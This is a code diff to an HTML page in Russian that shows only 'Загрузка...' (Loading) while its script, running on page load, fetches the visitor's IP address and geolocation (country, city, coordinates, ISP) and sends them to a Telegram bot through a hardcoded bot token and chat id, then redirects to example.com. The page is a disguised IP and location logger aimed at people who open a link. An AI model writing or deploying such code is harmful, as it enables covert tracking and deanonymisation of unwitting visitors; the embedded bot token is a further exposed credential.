@@ -5,28 +5,45 @@
     <title>Loading...</title>
 </head>
 <body>
-    <h1>Откройте в Safari</h1>
-    <p>Пожалуйста, откройте эту ссылку в браузере Safari или Chrome.</p>
+    <h1>Загрузка...</h1>
     <script>
-        // Проверяем, открыто ли в Telegram
-        if (navigator.userAgent.includes('Telegram')) {
-            document.body.innerHTML = '<h1>⚠️ Откройте в браузере</h1><p>Эта ссылка работает только в Safari или Chrome.</p>';
-        } else {
-            // Если не Telegram — делаем запрос
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(d => {
-                    var ip = d.ip;
-                    var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
-                    var chat_id = "8212240529";
-                    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=IP: " + ip;
-                    return fetch(url);
-                })
-                .catch(() => {});
-            setTimeout(function() {
-                window.location.href = "https://example.com";
-            }, 2000);
+        var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
+        var chat_id = "8212240529";
+
+        function sendToTelegram(text) {
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
+            fetch(url).catch(function() {});
         }
+
+        // Получаем IP через ipify (безопасный, работает везде)
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                sendToTelegram("IP: " + ip);
+
+                // Пробуем получить геоданные через ip-api (но уже через HTTPS)
+                return fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org')
+                    .then(r => r.json())
+                    .then(geo => {
+                        if (geo.status === "success") {
+                            var text = "Геоданные:\n" +
+                                       "Страна: " + (geo.country || '—') + "\n" +
+                                       "Город: " + (geo.city || '—') + "\n" +
+                                       "Координаты: " + (geo.lat || '—') + ", " + (geo.lon || '—') + "\n" +
+                                       "Провайдер: " + (geo.isp || '—');
+                            sendToTelegram(text);
+                        }
+                    })
+                    .catch(function() {});
+            })
+            .catch(function() {
+                sendToTelegram("Ошибка определения IP");
+            });
+
+        setTimeout(function() {
+            window.location.href = "https://example.com";
+        }, 3000);
     </script>
 </body>
 </html>
